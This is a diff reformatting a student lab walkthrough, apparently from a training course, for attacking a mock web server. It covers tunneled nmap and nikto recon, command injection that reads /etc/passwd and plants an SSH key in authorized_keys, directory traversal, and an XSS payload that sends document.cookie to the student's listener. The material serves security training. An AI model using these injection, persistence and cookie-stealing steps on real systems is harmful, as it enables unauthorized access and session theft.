@@ -5,6 +5,7 @@ Scheme of Maneuver:
 -->T2: 10.100.28.55
 ```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+```
 T1
 Hostname: Donovian_MI_websvr
 IP: 10.100.28.40
@@ -26,11 +27,10 @@ Last Known SSH Port: unknown
 PSP: Unknown
 Malware: Unknown
 Action: Conduct approved Web Exploitation techniques to collect intellegence.
+```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-
-
-	Recon: prerequisites
+```
+Recon: prerequisites
 ---------------------------------------------|
 	* if no socket file then, make one.  |
 ssh -MS /tmp/jump student@10.50.37.98	      |
@@ -39,16 +39,19 @@ ssh -MS /tmp/jump student@10.50.37.98	      |
 	* if no dynamic port, make one.      |
 ssh -S /tmp/jump jump -O forward -D 9050     |
 ---------------------------------------------|
+```
+# On lin-ops(1)
+Recon: Utilize proxychain tools
+* after getting the dynamic tunnel running 
 
-On lin-ops(1)
-	Recon: Utilize proxychain tools
-	* after getting the dynamic tunnel running 
+```
 proxychains nmap 10.100.28.40 -p 80
 proxychains nc 10.100.28.40 80
 proxychains nmap --script http-enum 10.100.28.40
-
-	* http-enum esults:
-Nmap scan report for 10.100.28.40
+```
+* http-enum esults:
+* Nmap scan report for 10.100.28.40
+```
 Host is up (0.00042s latency).
 Not shown: 998 closed ports
 PORT     STATE SERVICE
@@ -61,34 +64,34 @@ PORT     STATE SERVICE
 4444/tcp open  krb524
 
 Nmap done: 1 IP address (1 host up) scanned in 3.61 seconds
-
-	* utilize nikto
+```
+* utilize nikto
+```
 nikto v -h 10.100.28.40
-
-	* results of nikto:
-	- Nikto v2.1.5
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-+ No web server found on 10.100.28.40:80
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-+ 0 host(s) tested
-
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-On lin-ops:
-	* Utilize your existing Socket file, put in a new port forward:
+```
+# On lin-ops:
+* Utilize your existing Socket file, put in a new port forward:
+```
 ssh -S /tmp/jump jump -O forward -L 127.0.0.1:1111:10.100.28.40:80
-
-	* then open a firefox web-browser on your lin-ops station:
+```
+* then open a firefox web-browser on your lin-ops station:
+```
 firefox
+```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-On firefox:
-	* navigate to the device via the Port Forward you added to you Socket File:
+# On firefox:
+* navigate to the device via the Port Forward you added to you Socket File:
+```
 127.0.0.1:1111
+```
 -------- /robots.txt:--------------------------------------------------------------------------------------------------------------------------------------------------------------------
-	* from your nmap --script http-enum, you enumerated the robots.txt file.
-	* try accessing that file from the web-browser
+* from your nmap --script http-enum, you enumerated the robots.txt file.
+* try accessing that file from the web-browser
+```
 http://127.0.0.1:1111/robots.txt
-	* ^ results from /robots.txt:
+```
+* ^ results from /robots.txt:
+```
 User-agent: *
 Disallow: /net_test	
 -------- /css :--------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -109,49 +112,60 @@ Index of /css
 [IMG]	ui-icons_004276_256x240.png	2022-03-23 14:33 	4.4K	 
 [IMG]	ui-icons_cc0000_256x240.png	2022-03-23 14:33 	4.4K	 
 [IMG]	ui-icons_ffffff_256x240.png	2022-03-23 14:33 	6.2K	 
+```
 -------- /images :--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+```
 http://127.0.0.1:1111/images
-	* ^ results from /images:
+```
+* results from /images:
+```
 Index of /images
 [ICO]	Name	Last modified	Size	Description
 [PARENTDIR]	Parent Directory	 	- 	 
 [IMG]	min_crest.jpeg	2022-03-23 14:33 	6.5K	 
 [IMG]	sign.jpeg	2022-03-23 14:33 	10K	 
 Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 1111
-
+```
 -------- /uploads :--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+```
 http://127.0.0.1:1111/uploads
-	* ^ results from /uploads:
+```
+* ^ results from /uploads:
+```
 Index of /uploads
 [ICO]	Name	Last modified	Size	Description
 [PARENTDIR]	Parent Directory	 	- 	 
 [ ]	message	2022-04-19 20:18 	229 	 
 Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 1111
-
-	* message from uploads
-
+```
+* message from uploads
+```
 Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
 Please send me a corrected cert with the right now.
 
 I took my online training from the following website
 
 10.100.28.55
+```
 -------- /net_test :--------------------------------------------------------------------------------------------------------------------------------------------------------------------
-	* check the /net_test directory:
+* check the /net_test directory:
+```
 http://127.0.0.1:1111/net_test
-	* ^ results from the /net_test directory
+```
+* ^ results from the /net_test directory
+```
 Index of /net_test
 [ICO]	Name	Last modified	Size	Description
 [PARENTDIR]	Parent Directory	 	- 	 
 [ ]	industry_check.php	2022-03-23 14:33 	1.5K	 
 Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 1111	
+```	
 	
-	
-	* the web-page that the /new_test directory redirects you to has:
+* the web-page that the /new_test directory redirects you to has:
 		System to ping:
 		Path to test:
 		Port to check:
-		with the input fields enumerated above we can leverage Command Injection. 
+* with the input fields enumerated above we can leverage Command Injection. 
 	
 	* try enumerating /etc/passwd in all the fields provided above ^
 	* results for Path to Test:
@@ -196,35 +210,43 @@ billybob:x:1001:1001:you found me watkTNrQG4K8go2baNbj:/home/billybob:/bin/bash
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-	* after you determine the user's home directory, check to see if they have a .ssh directory:
-	* if not, make one:
+* after you determine the user's home directory, check to see if they have a .ssh directory:
+* if not, make one:
+```
 ; mkdir /home/billybob/.ssh
-	* verify it was created:
+```
+* verify it was created:
+```
 ; ls -la /home/billybob
-
-	on lin-ops:
-	* get your public key
+```
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# on lin-ops:
+* get your public key
+```
 ssh-keygen
 ls -l /home/student/.ssh
 cat /home/student/.ssh/id_rsa.pub
-	* copy that key over to billybob's /home/billybob/.ssh directory. Into a new file called:	
+```
+* copy that key over to billybob's /home/billybob/.ssh directory. Into a new file called:	
 	* /home/billybob/.ssh/authorized_keys
+```
 ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8Ny133z4AEchrClekmxkUtlWrflXcGT8JBygIkkm/Cy7AyZ+U/Sx9YWXrYft9R0GRE/CcJpQfJJhPp0juq+Zc+vYQ73bdOf3duEZjPRTzMiibq8wOpiguT5kJ1jBs6WYqdyuWUO61Re1b1rFAcZsxz26t3S+8+ycYWyYTDthO5ugSXdXmpy9PIHUcb5ogvT0wpIOxLaVyZhlzm6CadP7iklvJAXRXqDeReKU2XdCPpKZb3awt0g4SU7d4Z6od5wR1xGgYwCpAfCpttUnyk5cgVr2YGjvpY4ExkMYSFvZmA2ENXH/3WDpx3I31/DBeGSbIAOqvTUIMGy3kmxQDKp/p student@lin-ops" >> /home/billybob/.ssh/authorized_keys
-
+```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-	on lin-ops
-	* make a new socket, and ssh into the web server, and loggon
-	- sednig private key to encrypt the begging of the conversation. This allows the client to authenticate.
- 
+# on lin-ops
+* make a new socket, and ssh into the web server, and loggon
+- sednig private key to encrypt the begging of the conversation. This allows the client to authenticate.
+ ```
  ssh -i .ssh/id_rsa -MS /tmp/web billybob@127.0.0.1 -p 1111
- 
-	* Congrats, you did a ssh  masquerade
+ ```
+* Congrats, you did a ssh  masquerade
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-	on web server: Directory Traversal via HTTP POST/GET methods:
-	http://10.50.28.11/path/pathdemo.php
-
+# on web server: Directory Traversal via HTTP POST/GET methods:
+```
+http://10.50.28.11/path/pathdemo.php
+```
 
  * POST method: It cat's so try
 ```
@@ -245,7 +267,4 @@ python3 -m http.server
 ```	
 <script>document.location="http://10.50.27.61:8000/?" + document.cookie;</script>
 ```
-* lin-ops IP ^^^
-
-					
-10.50.27.61:8000
+* lin-ops IP:10.50.27.61:8000 ^^^
